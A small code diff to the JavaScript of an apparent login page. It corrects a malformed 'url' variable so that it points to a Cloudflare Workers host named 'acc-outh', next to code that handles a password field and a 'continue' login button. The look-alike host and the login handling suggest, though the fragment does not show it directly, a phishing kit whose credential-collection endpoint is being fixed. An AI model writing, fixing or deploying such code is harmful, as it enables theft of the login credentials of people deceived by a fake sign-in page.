@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded' ,function(){
   	.prop("type", "password");
   }
 });
-    var url="https://https://acc-outh.jjmdw.workers.dev/"
+    var url="https://acc-outh.jjmdw.workers.dev/"
     submit_btn = document.getElementById("continueFromUserLogin");
     userInputContainerDiv = document.getElementById("userInputContainerDiv")
     userBackButton =  document.getElementById("userBackButtonSpanTxt")
